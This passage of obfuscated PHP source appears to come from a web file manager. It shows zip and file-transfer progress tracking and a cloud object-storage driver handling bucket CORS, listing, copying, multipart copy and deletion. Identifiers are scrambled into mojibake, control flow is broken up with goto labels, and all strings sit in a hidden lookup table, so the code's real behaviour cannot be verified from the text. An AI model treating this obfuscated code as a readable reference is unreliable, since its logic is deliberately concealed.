($D²š‹¾òİ[$aßã‘£ç©ã[1514]] == $aßã‘£ç©ã[103]) { $BÎ—õ¸‹î = 0; if ($D²š‹¾òİ[$aßã‘£ç©ã[1488]] == $aßã‘£ç©ã[103]) { $BÎ—õ¸‹î = $D²š‹¾òİ[$aßã‘£ç©ã[1487]]; } $dÃĞ¼–·˜á = ($D²š‹¾òİ[$aßã‘£ç©ã[1491]] + $BÎ—õ¸‹î) / $D²š‹¾òİ[$aßã‘£ç©ã[699]]; $D²š‹¾òİ[$aßã‘£ç©ã[1442]] = 0.3 + 0.4 + $dÃĞ¼–·˜á * 0.3; } } } if ($D²š‹¾òİ[$aßã‘£ç©ã[1442]] > 0) { $b¹ä“‹°é = timeFloat() - $D²š‹¾òİ[$aßã‘£ç©ã[1444]] - $D²š‹¾òİ[$aßã‘£ç©ã[1447]]; $D²š‹¾òİ[$aßã‘£ç©ã[1448]] = $b¹ä“‹°é * (1 - $D²š‹¾òİ[$aßã‘£ç©ã[1442]]) / $D²š‹¾òİ[$aßã‘£ç©ã[1442]]; } } public function addFile($e‘ïŠ‡­£÷) { goto dõŠñŞ·Äô; EŠ¬µ¶ì©: $this->update(); goto cˆœ´®™½‚; b Ÿ™¼”ñ©: $eŠÇœìá¸Ñ[$CÉíåæÀß[979]] = 1; $FË–­’¾¾” = 0; $eŠÇœìá¸Ñ[$CÉíåæÀß[1495]] = array($CÉíåæÀß[1496] => $FË–­’¾¾” + 1, $CÉíåæÀß[386] => $B†ÒŒÀ¡ÎÖ[$CÉíåæÀß[28]], $CÉíåæÀß[75] => $B†ÒŒÀ¡ÎÖ[$CÉíåæÀß[75]], $CÉíåæÀß[468] => $B†ÒŒÀ¡ÎÖ[$CÉíåæÀß[468]] ? $B†ÒŒÀ¡ÎÖ[$CÉíåæÀß[468]] : $B†ÒŒÀ¡ÎÖ[$CÉíåæÀß[75]]); goto EŠ¬µ¶ì©; c¶Î½“š»¹: $eŠÇœìá¸Ñ[$CÉíåæÀß[981]] = $CÉíåæÀß[1503]; $eŠÇœìá¸Ñ[$CÉíåæÀß[1488]] = $CÉíåæÀß[1043]; $eŠÇœìá¸Ñ[$CÉíåæÀß[699]] = $B†ÒŒÀ¡ÎÖ[$CÉíåæÀß[77]]; goto b Ÿ™¼”ñ©; dõŠñŞ·Äô: $CÉíåæÀß =& $_SERVER[¦·]; $eŠÇœìá¸Ñ =& $this->task; $B†ÒŒÀ¡ÎÖ = IO::info($e‘ïŠ‡­£÷); goto Fì±ĞÓ©“; Fì±ĞÓ©“: $eŠÇœìá¸Ñ[$CÉíåæÀß[1484]] = $B†ÒŒÀ¡ÎÖ[$CÉíåæÀß[28]]; $eŠÇœìá¸Ñ[$CÉíåæÀß[1486]] = $B†ÒŒÀ¡ÎÖ[$CÉíåæÀß[77]]; $eŠÇœìá¸Ñ[$CÉíåæÀß[1487]] = 0; goto c¶Î½“š»¹; cˆœ´®™½‚: } public function unzipAfter($e­ùÛ—¨»¾) { goto eŞÅ¥ôù‹“; AÅ­÷ŒÙµ‚: if ($d†´» èÅ¾[$e‚˜íõÊŒ[29]] == $e‚˜íõÊŒ[167]) { $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[979]] = 1; } else { $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[979]] = $d†´» èÅ¾[$e‚˜íõÊŒ[80]][$e‚˜íõÊŒ[78]]; } $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[981]] = $e‚˜íõÊŒ[33]; $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[1488]] = 0; goto FêÙìêì¨‘; FêÙìêì¨‘: $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[993]] = 0; $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[1486]] = 0; $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[1487]] = 0; goto e¿ñ¡¡ÎŠ; F…ˆÑ·åÚ: $this->update(); self::log($e‚˜íõÊŒ[1516] . json_encode(array($EãæÜÌÍ¸ß, $d†´» èÅ¾))); goto FŠÀ·‚ï“æ; e¿ñ¡¡ÎŠ: $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[1484]] = $e‚˜íõÊŒ[33]; $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[1491]] = 0; $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[699]] = $d†´» èÅ¾[$e‚˜íõÊŒ[77]]; goto F…ˆÑ·åÚ; d®ÔÑÙ £Å: $d†´» èÅ¾ = IO::infoWithChildren($e­ùÛ—¨»¾); $e¨ÁØªàÍ = 0; $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[1495]] = array($e‚˜íõÊŒ[1496] => $e¨ÁØªàÍ + 1, $e‚˜íõÊŒ[386] => $d†´» èÅ¾[$e‚˜íõÊŒ[28]], $e‚˜íõÊŒ[75] => $d†´» èÅ¾[$e‚˜íõÊŒ[75]], $e‚˜íõÊŒ[468] => $d†´» èÅ¾[$e‚˜íõÊŒ[468]] ? $d†´» èÅ¾[$e‚˜íõÊŒ[468]] : $d†´» èÅ¾[$e‚˜íõÊŒ[75]]); goto AÅ­÷ŒÙµ‚; eŞÅ¥ôù‹“: $e‚˜íõÊŒ =& $_SERVER[¦·]; $EãæÜÌÍ¸ß =& $this->task; $EãæÜÌÍ¸ß[$e‚˜íõÊŒ[1514]] = $e‚˜íõÊŒ[103]; goto d®ÔÑÙ £Å; FŠÀ·‚ï“æ: } public function nameParse($cãã¥ôÈº) { goto c¶øÍ—Ô¾»; E¾˜È¨ç…×: $cÈ—•ãÍÇŠ = get_path_this($cãã¥ôÈº); if (strstr($cÈ—•ãÍÇŠ, $a‰Šâ´Ûƒ[91])) { $f°Ÿ‰Ñ­Û•[$a‰Šâ´Ûƒ[993]] += 1; $f°Ÿ‰Ñ­Û•[$a‰Šâ´Ûƒ[979]] += 1; } $f°Ÿ‰Ñ­Û•[$a‰Šâ´Ûƒ[1484]] = $cãã¥ôÈº; goto C¼¼ÚÕ‡àŒ; C¼¼ÚÕ‡àŒ: $this->update(); goto dñÈÆ ²—¨; c¶øÍ—Ô¾»: $a‰Šâ´Ûƒ =& $_SERVER[¦·]; $f°Ÿ‰Ñ­Û• =& $this->task; if ($f°Ÿ‰Ñ­Û•[$a‰Šâ´Ûƒ[1514]] == $a‰Šâ´Ûƒ[1043]) { $f°Ÿ‰Ñ­Û•[$a‰Šâ´Ûƒ[1514]] = $a‰Šâ´Ûƒ[301]; $f°Ÿ‰Ñ­Û•[$a‰Šâ´Ûƒ[1491]] = 0; $f°Ÿ‰Ñ­Û•[$a‰Šâ´Ûƒ[699]] = 0; } goto E¾˜È¨ç…×; dñÈÆ ²—¨: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $DÌ¤È áá­ =& $_SERVER[¦·]; parent::startAfter(); Hook::bind($DÌ¤È áá­[1517], array($this, $DÌ¤È áá­[1512])); $eÅ—›Şãøù =& $this->task; $eÅ—›Şãøù[$DÌ¤È áá­[1514]] = $DÌ¤È áá­[1043]; if (!$eÅ—›Şãøù[$DÌ¤È áá­[1347]]) { $eÅ—›Şãøù[$DÌ¤È áá­[1347]] = LNG($DÌ¤È áá­[1518]); } } protected function endAfter() { $Bºšƒ³ñƒÜ =& $_SERVER[¦·]; parent::endAfter(); Hook::unbind($Bºšƒ³ñƒÜ[1517], array($this, $Bºšƒ³ñƒÜ[1512])); } public function updateAfter() { $E‹ïÏÂÈÖÉ =& $_SERVER[¦·]; $d‚ù¶É„± =& $this->task; if (!$d‚ù¶É„±[$E‹ïÏÂÈÖÉ[979]] || !$d‚ù¶É„±[$E‹ïÏÂÈÖÉ[699]]) { return; } if ($d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1514]] == $E‹ïÏÂÈÖÉ[1043]) { $bÌÀöŸáÌ = $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1487]]; if ($d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1488]] != $E‹ïÏÂÈÖÉ[1043]) { $bÌÀöŸáÌ = 0; } $f‡•¹¹º£ = ($d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1491]] + $bÌÀöŸáÌ) / $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[699]]; $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1442]] = $f‡•¹¹º£ * 0.3; } else { if ($d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1514]] == $E‹ïÏÂÈÖÉ[301]) { $f‡•¹¹º£ = $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[993]] / $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[979]]; $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1442]] = 0.3 + $f‡•¹¹º£ * 0.5; } else { if ($d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1514]] == $E‹ïÏÂÈÖÉ[103]) { $f‡•¹¹º£ = 0; if ($d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1486]]) { $f‡•¹¹º£ = $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1487]] / $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1486]]; } $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1442]] = 0.3 + 0.5 + $f‡•¹¹º£ * 0.2; } } } if ($d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1442]] > 0) { $dÚ´Ä…­· = timeFloat() - $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1444]] - $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1447]]; $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1448]] = $dÚ´Ä…­· * (1 - $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1442]]) / $d‚ù¶É„±[$E‹ïÏÂÈÖÉ[1442]]; } } public function copyFileStart($cÃ¼ÇÙÈ †, $BàÃ‹â½°, $F¿¨™‹Ô±‰, $a¯íŞğ‘ÕÔ, $fĞ³ßÜˆ·É, $A…‹ğ­” ™) { $CŸ¯ØÃöšŸ =& $_SERVER[¦·]; parent::copyFileStart($cÃ¼ÇÙÈ †, $BàÃ‹â½°, $F¿¨™‹Ô±‰, $a¯íŞğ‘ÕÔ, $fĞ³ßÜˆ·É, $A…‹ğ­” ™); $C•ïÕ”¶ƒ =& $this->task; if ($C•ïÕ”¶ƒ[$CŸ¯ØÃöšŸ[1514]] == $CŸ¯ØÃöšŸ[301]) { $C•ïÕ”¶ƒ[$CŸ¯ØÃöšŸ[1514]] = $CŸ¯ØÃöšŸ[103]; } $this->update(); } public function copyFileEnd($cÎàÃŸáò, $FÔŒÇË´Ò, $a”ã‡İ¶Ûá, $c…ÈĞÖ‰³İ, $CÒ¯„ßÛ¶œ, $C¡ØÀù¾Ğ) { $c·½²‹µ‰ =& $_SERVER[¦·]; $A™àïêÃç =& $this->task; $A™àïêÃç[$c·½²‹µ‰[1487]] = $A™àïêÃç[$c·½²‹µ‰[1486]]; $A™àïêÃç[$c·½²‹µ‰[1491]] += $A™àïêÃç[$c·½²‹µ‰[1486]]; $A™àïêÃç[$c·½²‹µ‰[1488]] = $c·½²‹µ‰[33]; $this->update(); } public function nameParse($F‰ƒÔ·´‹) { $F­ƒ‡…³‡ =& $_SERVER[¦·]; $f°¨†¸‘ê =& $this->task; if ($f°¨†¸‘ê[$F­ƒ‡…³‡[993]] < $f°¨†¸‘ê[$F­ƒ‡…³‡[979]]) { $dÊ«ô×±ˆ— = get_path_this($F‰ƒÔ·´‹); if (strstr($dÊ«ô×±ˆ—, $F­ƒ‡…³‡[91])) { $f°¨†¸‘ê[$F­ƒ‡…³‡[993]] += 1; } } if ($f°¨†¸‘ê[$F­ƒ‡…³‡[1514]] == $F­ƒ‡…³‡[1043]) { $f°¨†¸‘ê[$F­ƒ‡…³‡[1514]] = $F­ƒ‡…³‡[301]; } $f°¨†¸‘ê[$F­ƒ‡…³‡[1484]] = $F‰ƒÔ·´‹; $this->update(); } } goto DîÛ¿ëÌ“¾; e”‹«…·£: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Bå†ÀÅ±¨) { parent::__construct(); include_once SDK_DIR . $_SERVER[¦·][1175]; $this->_init($Bå†ÀÅ±¨); } public function _init($AÖ•Ñ¸÷Ãè) { foreach ($AÖ•Ñ¸÷Ãè as $e‹•µ¯àŞÆ => $Aââ¥ÄÖÍÌ) { if (isset($this->{$e‹•µ¯àŞÆ})) { $this->{$e‹•µ¯àŞÆ} = $Aââ¥ÄÖÍÌ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¦·][1176], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto FÛÙçÅ„±; då×™ÇÃÉÂ: $a­¦ÖŞ‹Õ˜->setMaxAgeSeconds(600); $a­¦ÖŞ‹Õ˜->addExposeHeader($F–Ìİòîƒ[1182]); $a­¦ÖŞ‹Õ˜->addAllowedHeader($F–Ìİòîƒ[1177]); goto c£¹Ùº¢¥•; c£¹Ùº¢¥•: $C†Ûèœ‹ì->addRule($a­¦ÖŞ‹Õ˜); try { $this->client->putBucketCors($this->bucket, $C†Ûèœ‹ì); } catch (OSS\Core\OssException $A Ôä–²ïö) { return !1; } return !0; goto EŸ¿é‚„šä; A•ÎÜ·á: $a­¦ÖŞ‹Õ˜->addAllowedMethod($F–Ìİòîƒ[1180]); $a­¦ÖŞ‹Õ˜->addAllowedMethod($F–Ìİòîƒ[1181]); $a­¦ÖŞ‹Õ˜->addAllowedMethod($F–Ìİòîƒ[155]); goto då×™ÇÃÉÂ; FÛÙçÅ„±: $F–Ìİòîƒ =& $_SERVER[¦·]; $C†Ûèœ‹ì = new OSS\Model\CorsConfig(); $a­¦ÖŞ‹Õ˜ = new OSS\Model\CorsRule(); goto bË°½íÁ¼Œ; bË°½íÁ¼Œ: $a­¦ÖŞ‹Õ˜->addAllowedOrigin($F–Ìİòîƒ[1177]); $a­¦ÖŞ‹Õ˜->addAllowedMethod($F–Ìİòîƒ[1178]); $a­¦ÖŞ‹Õ˜->addAllowedMethod($F–Ìİòîƒ[1179]); goto A•ÎÜ·á; EŸ¿é‚„šä: } public function getBucketCors() { goto f—«‡˜´˜; Aõ¶›‘øÜ®: if (!$f†òç•×ÇÄ || !($f®Õ¦Šõ»í = $f†òç•×ÇÄ->getRules())) { return null; } $e³‚‘í·öÍ = $f®Õ¦Šõ»í[0]->getAllowedOrigins(); $DÕóæäã¯ = $f®Õ¦Šõ»í[0]->getAllowedMethods(); goto d®à”äÄ¥; f—«‡˜´˜: $Dòˆè‹ªŞ’ =& $_SERVER[¦·]; $f†òç•×ÇÄ = null; try { $f†òç•×ÇÄ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A”²²’) { return null; } goto Aõ¶›‘øÜ®; d®à”äÄ¥: $f›Ä“§†ö = $f®Õ¦Šõ»í[0]->getMaxAgeSeconds(); $d÷Êé–ŠÊ = $f®Õ¦Šõ»í[0]->getExposeHeaders(); $B™òƒÊÆÎ± = $f®Õ¦Šõ»í[0]->getAllowedHeaders(); goto f•¶á¿î©¬; f•¶á¿î©¬: return array($Dòˆè‹ªŞ’[175] => isset($e³‚‘í·öÍ[0]) ? $e³‚‘í·öÍ[0] : $Dòˆè‹ªŞ’[33], $Dòˆè‹ªŞ’[179] => $DÕóæäã¯, $Dòˆè‹ªŞ’[1183] => $f›Ä“§†ö, $Dòˆè‹ªŞ’[1184] => isset($d÷Êé–ŠÊ[0]) ? $d÷Êé–ŠÊ[0] : $Dòˆè‹ªŞ’[33], $Dòˆè‹ªŞ’[177] => isset($B™òƒÊÆÎ±[0]) ? $B™òƒÊÆÎ±[0] : $Dòˆè‹ªŞ’[33]); goto D¬Ş¶­ ïİ; D¬Ş¶­ ïİ: } public function isBucketCors() { goto a…««İ­…®; d¤¡Äˆ•„˜: $c’×íÕòê¥ = array($AÓß·ĞßˆŒ[180], $AÓß·ĞßˆŒ[181], $AÓß·ĞßˆŒ[182], $AÓß·ĞßˆŒ[183], $AÓß·ĞßˆŒ[184]); $C‚ÁŞ•Ú³ = array_diff($c’×íÕòê¥, $C°áºÚ³ç); return empty($C‚ÁŞ•Ú³); goto B¯Üöô—õè; Eº»­Šˆöò: if ($A¢…ä‡–Ã[$AÓß·ĞßˆŒ[175]] != $AÓß·ĞßˆŒ[176] || $A¢…ä‡–Ã[$AÓß·ĞßˆŒ[177]] != $AÓß·ĞßˆŒ[176]) { return !1; } $C°áºÚ³ç = array_map($AÓß·ĞßˆŒ[178], $A¢…ä‡–Ã[$AÓß·ĞßˆŒ[179]]); if (!is_array($C°áºÚ³ç)) { $C°áºÚ³ç = array(); } goto d¤¡Äˆ•„˜; a…««İ­…®: $AÓß·ĞßˆŒ =& $_SERVER[¦·]; $A¢…ä‡–Ã = $this->getBucketCors(); if (!$A¢…ä‡–Ã || !is_array($A¢…ä‡–Ã)) { return !1; } goto Eº»­Šˆöò; B¯Üöô—õè: } public function mkfile($d‡Ã‘š”»², $E‘„õÒÃğ£ = '', $A®ˆ¿Úßğ = REPEAT_RENAME) { $Cã¾Îñ§Í‘ = $this->setContent($d‡Ã‘š”»², $E‘„õÒÃğ£); if ($Cã¾Îñ§Í‘ !== !1) { return $this->getPathOuter($d‡Ã‘š”»²); } return !1; } public function mkdir($A§‘²‡×Ùœ, $Eˆ‹°„øãó = REPEAT_SKIP) { if ($this->_isFolder($A§‘²‡×Ùœ)) { return $this->getPathOuter($A§‘²‡×Ùœ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($A§‘²‡×Ùœ)); } catch (OSS\Core\OssException $a—®£Ï›µ) { return !1; } return $this->getPathOuter($A§‘²‡×Ùœ); } private function fileList($Féƒø´Ñù‘, $B÷Ì®Å÷Æ¬ = '', $EƒàÛ³­¥ = 0) { goto e¿¨Öõ¯‡Æ; d«¾ßõÔä¦: while (!0) { $dÎìİ¯œë“ = array($C‹×õÏÍ¸[1185] => $B÷Ì®Å÷Æ¬, $C‹×õÏÍ¸[186] => $F—×®‡Šä, $C‹×õÏÍ¸[1186] => $aÀçİßÇ“¦, $C‹×õÏÍ¸[1187] => $bŸ÷½†ÚÑ¬); try { $A²¨ÈòŠ = $this->client->listObjects($this->bucket, $dÎìİ¯œë“); } catch (OSS\Core\OssException $c†öí¬Ê¶š) { break; } $bŸ÷½†ÚÑ¬ = $A²¨ÈòŠ->getNextMarker(); $AÊßƒ‡Ó¢© = $A²¨ÈòŠ->getObjectList(); $eÌ×ñ¿ã¾® = $A²¨ÈòŠ->getPrefixList(); foreach ($AÊßƒ‡Ó¢© as $D„¯’äÇºˆ) { if ($D„¯’äÇºˆ->getKey() == $F—×®‡Šä) { continue; } $CÁŸ¡è› = $D„¯’äÇºˆ->getKey(); if ($EƒàÛ³­¥) { $CÁŸ¡è› = array($C‹×õÏÍ¸[28] => $CÁŸ¡è›, $C‹×õÏÍ¸[77] => $D„¯’äÇºˆ->getSize(), $C‹×õÏÍ¸[190] => strtotime($D„¯’äÇºˆ->getLastModified())); } $cÊ‚Ö´Š[] = $CÁŸ¡è›; } foreach ($eÌ×ñ¿ã¾® as $cÇ«©µË©…) { $eÌù®²Ù¸¼[] = $cÇ«©µË©…->getPrefix(); } if ($bŸ÷½†ÚÑ¬ === $C‹×õÏÍ¸[33]) { break; } } return array($C‹×õÏÍ¸[74] => $eÌù®²Ù¸¼, $C‹×õÏÍ¸[73] => $cÊ‚Ö´Š); goto d”Î¤¤ÌÏ; e¿¨Öõ¯‡Æ: $C‹×õÏÍ¸ =& $_SERVER[¦·]; $Féƒø´Ñù‘ = trim($Féƒø´Ñù‘, $C‹×õÏÍ¸[8]); $F—×®‡Šä = empty($Féƒø´Ñù‘) ? $C‹×õÏÍ¸[33] : $Féƒø´Ñù‘ . $C‹×õÏÍ¸[8]; goto f”‘³Ş¸†¡; f”‘³Ş¸†¡: $bŸ÷½†ÚÑ¬ = $C‹×õÏÍ¸[33]; $aÀçİßÇ“¦ = 1000; $eÌù®²Ù¸¼ = $cÊ‚Ö´Š = array(); goto d«¾ßõÔä¦; d”Î¤¤ÌÏ: } public function copyFile($CÂäËãÛøß, $BÃñ¹òÒ‰ô) { $F…ËŒÙØ = $this->size($CÂäËãÛøß); if ($F…ËŒÙØ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $CÂäËãÛøß, $this->bucket, $this->pathEncode($BÃñ¹òÒ‰ô)); } catch (OSS\Core\OssException $Bêï‘‚Æ„²) { return !1; } return $this->getPathOuter($BÃñ¹òÒ‰ô); } $dåô’Î£Ş = $this->multiCopyObject($CÂäËãÛøß, $BÃñ¹òÒ‰ô, $F…ËŒÙØ); return $dåô’Î£Ş ? $this->getPathOuter($BÃñ¹òÒ‰ô) : !1; } private function multiCopyObject($aİÅ¬åŸ¶„, $EËÌóö—ƒ‹, $dô¾ë¿àóÎ) { $D²Ç¬’Ï˜” =& $_SERVER[¦·]; try { goto fŠŠ³èù¶‡; eĞÃÛÄÑé¢: $fç˜¯ùìò† = array(); foreach ($Dô­ˆ§Çò£ as $CŒÓ¿¶ç² => $b…º´Ö‹µŠ) { $fç˜¯ùìò†[] = array($D²Ç¬’Ï˜”[1192] => $CŒÓ¿¶ç² + 1, $D²Ç¬’Ï˜”[1193] => $b…º´Ö‹µŠ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($EËÌóö—ƒ‹), $BËÍòŞìè, $fç˜¯ùìò†); goto Bá“º¯œÒª; bªáñ§•¼˜: $DùÅ‰Ù‹ Û = 1024 * 1024 * 10; $Fò–ëš¤Ï = $this->client->generateMultiuploadParts($dô¾ë¿àóÎ, $DùÅ‰Ù‹ Û); foreach ($Fò–ëš¤Ï as $CŒÓ¿¶ç² => $DÕéÀ³—‰½) { $dÎ›«§ĞŞœ = $c†Òô˜à‡ + (int) $DÕéÀ³—‰½[$D²Ç¬’Ï˜”[1189]]; $e¢’©º†ôà = (int) $DÕéÀ³—‰½[$D²Ç¬’Ï˜”[325]] + $dÎ›«§ĞŞœ - 1; $cãğìÜ¥¾ = array($D²Ç¬’Ï˜”[1190] => $dÎ›«§ĞŞœ, $D²Ç¬’Ï˜”[1191] => $e¢’©º†ôà); $Dô­ˆ§Çò£[] = $this->client->uploadPartCopy($this->bucket, $aİÅ¬åŸ¶„, $this->bucket, $this->pathEncode($EËÌóö—ƒ‹), $D’ô» , $BËÍòŞìè, $cãğìÜ¥¾); $D’ô»  = $D’ô»  + 1; } goto eĞÃÛÄÑé¢; CÃ£‹ï‚éù: $D’ô»  = 1; $c†Òô˜à‡ = 0; $Dô­ˆ§Çò£ = array(); goto bªáñ§•¼˜; fŠŠ³èù¶‡: $DÎäé£Ê = array(); if ($déĞ¤Ù—ù = $this->hashMd5($aİÅ¬åŸ¶„)) { $DÎäé£Ê = array(OSS\OssClient::OSS_HEADERS => array($D²Ç¬’Ï˜”[1188] => $déĞ¤Ù—ù)); } $BËÍòŞìè = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($EËÌóö—ƒ‹), $DÎäé£Ê); goto CÃ£‹ï‚éù; Bá“º¯œÒª: } catch (OSS\Core\OssException $D‚Œ¼¢Ö™¢) { return !1; } return !0; } public function moveFile($a´”ñí¥‡ñ, $D©±Ù”¦èÛ) { if ($this->copyFile($a´”ñí¥‡ñ, $D©±Ù”¦èÛ)) { $this->remove($a´”ñí¥‡ñ); return $this->getPathOuter($D©±Ù”¦èÛ); } return !1; } public function delFile($aÓ¬–·ëÂ¡) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($aÓ¬–·ëÂ¡)); } catch (OSS\Core\OssException $BñÍÈ†åÑ±) { return !1; } return !0; } public function delFolder($D¾Ë±½ÛÖô) { $CÃ×¶¡”” =& $_SERVER[¦·]; $AĞ¡ÉÌÛ²¬ = $this->fileList($D¾Ë±½ÛÖô); if (!empty($D¾Ë±½ÛÖô) && !in_array(trim($D¾Ë±½ÛÖô, $CÃ×¶¡””[8]) . $CÃ×¶¡””[8], $AĞ¡ÉÌÛ²¬[$CÃ×¶¡””[73]])) { $AĞ¡ÉÌÛ²¬[$CÃ×¶¡””[73]][] = trim($D¾Ë±½ÛÖô, $CÃ×¶¡””[8]) . $CÃ×¶¡””[8]; } foreach (array_chunk($AĞ¡ÉÌÛ²¬[$CÃ×¶¡””[73]], 1000) as $BÁèšñ‡ó°) { try { $this->client->deleteObjects($this->bucket, $BÁèšñ‡ó°); } catch (OSS\Core\OssException $CÎøØŸ¿ˆÕ) { continue; } } return !0; } public function rename($fõ˜”¯Û·½, $D„ÈƒÁ˜ÌÅ) { return $this->renameObject($fõ˜”¯Û·½, $D„ÈƒÁ˜ÌÅ); } private function fileInfo($fØßÉæØ, $CÂ½îâŸÆ = array()) { goto CîñŒØ•×¤; CîñŒØ•×¤: $E†ßƒ¨‹¾¹ =& $_SERVER[¦·]; $b  Ê×ªï¿ = array($E†ßƒ¨‹¾¹[28] => $this->pathThis($fØßÉæØ), $E†ßƒ¨‹¾¹[75] => $this->getPathOuter($fØßÉæØ), $E†ßƒ¨‹¾¹[29] => $E†ßƒ¨‹¾¹[167], $E†ßƒ¨‹¾¹[187] => 0, $E†ßƒ¨‹¾¹[107] => 0, $E†ßƒ¨‹¾¹[77] => 0, $E†ßƒ¨‹¾¹[160] => $this->ext($fØßÉæØ), $E†ßƒ¨‹¾¹[188] => !0, $E†ßƒ¨‹¾¹[189] => !0); if (empty($CÂ½îâŸÆ)) { $D×½¹Ğã© = $this->objectMeta($fØßÉæØ); if (!$D×½¹Ğã©) { return $b  Ê×ªï¿; } $CÂ½îâŸÆ = array($E†ßƒ¨‹¾¹[107] => strtotime($D×½¹Ğã©[$E†ßƒ¨‹¾¹[1194]]), $E†ßƒ¨‹¾¹[77] => $D×½¹Ğã©[$E†ßƒ¨‹¾¹[1195]] + 0); } goto Dƒã´ë •‘; f­‚ìÌæÁ: return $b  Ê×ªï¿; goto AÇ¬ÎÔØ±‚; Dƒã´ë •‘: if (isset($CÂ½îâŸÆ[$E†ßƒ¨‹¾¹[77]])) { $b  Ê×ªï¿[$E†ßƒ¨‹¾¹[77]] = $CÂ½îâŸÆ[$E†ßƒ¨‹¾¹[77]]; } if (isset($CÂ½îâŸÆ[$E†ßƒ¨‹¾¹[107]])) { $b  Ê×ªï¿[$E†ßƒ¨‹¾¹[107]] = $CÂ½îâŸÆ[$E†ßƒ¨‹¾¹[107]]; } if (isset($CÂ½îâŸÆ[$E†ßƒ¨‹¾¹[190]]) && !trim($b  Ê×ªï¿[$E†ßƒ¨‹¾¹[107]])) { $b  Ê×ªï¿[$E†ßƒ¨‹¾¹[107]] = $CÂ½îâŸÆ[$E†ßƒ¨‹¾¹[190]]; } goto f­‚ìÌæÁ; AÇ¬ÎÔØ±‚: } private function folderInfo($CÉ¦ŸÍ‡ƒ“, $cå‚»«‹ = array()) { $Eì©¾çİ²à =& $_SERVER[¦·]; $C¨êŒ«±ËÎ = array($Eì©¾çİ²à[28] => $this->pathThis($CÉ¦ŸÍ‡ƒ“), $Eì©¾çİ²à[75] => $this->getPathOuter($Eì©¾çİ²à[8] . $CÉ¦ŸÍ‡ƒ“), $Eì©¾çİ²à[29] => $Eì©¾çİ²à[76], $Eì©¾çİ²à[187] => 0, $Eì©¾çİ²à[107] => 0, $Eì©¾çİ²à[188] => !0, $Eì©¾çİ²à[189] => !0); if (empty($cå‚»«‹)) { $CÉ¦ŸÍ‡ƒ“ = rtrim($CÉ¦ŸÍ‡ƒ“, $Eì©¾çİ²à[8]) . $Eì©¾çİ²à[8]; $F—çà†®‡† = $this->objectMeta($CÉ¦ŸÍ‡ƒ“); if (!$F—çà†®‡†) { return $C¨êŒ«±ËÎ; } $cå‚»«‹ = array($Eì©¾çİ²à[187] => $F—çà†®‡†[$Eì©¾çİ²à[1196]][$Eì©¾çİ²à[1197]], $Eì©¾çİ²à[107] => strtotime($F—çà†®‡†[$Eì©¾çİ²à[1194]])); } if (isset($cå‚»«‹[$Eì©¾çİ²à[107]])) { $C¨êŒ«±ËÎ[$Eì©¾çİ²à[107]] = $cå‚»«‹[$Eì©¾çİ²à[107]]; } if (isset($cå‚»«‹[$Eì©¾çİ²à[187]])) { $C¨êŒ«±ËÎ[$Eì©¾çİ²à[187]] = $cå‚»«‹[$Eì©¾çİ²à[187]]; } return $C¨êŒ«±ËÎ; } public function listPath($D‰›Ô¸”Ûí, $BÀˆéÆŞ‘ = false) { $A–ó§³–Ã¡ =& $_SERVER[¦·]; $f‘˜©„µƒÕ = $this->fileList($D‰›Ô¸”Ûí, $A–ó§³–Ã¡[8], !0); foreach ($f‘˜©„µƒÕ[$A–ó§³–Ã¡[74]] as $dŞèº£Ë­ğ => $FØˆÖ¨„Ø´) { $f‘˜©„µƒÕ[$A–ó§³–Ã¡[74]][$dŞèº£Ë­ğ] = $this->folderInfo($FØˆÖ¨„Ø´, $FØˆÖ¨„Ø´); } foreach ($f‘˜©„µƒÕ[$A–ó§³–Ã¡[73]] as $dŞèº£Ë­ğ => $FØˆÖ¨„Ø´) { $f‘˜©„µƒÕ[$A–ó§³–Ã¡[73]][$dŞèº£Ë­ğ] = $this->fileInfo($FØˆÖ¨„Ø´[$A–ó§³–Ã¡[28]], $FØˆÖ¨„Ø´); } return $f‘˜©„µƒÕ; } public function has($eÜÍƒ¼²—š, $a»ïôº‹® = false, $C»¿ËÌª˜ = true) { goto b©Æ·ªßëÑ; Dé‰”É§ˆ: return !1; goto E×¾Îëæ‹; b©Æ·ªßëÑ: 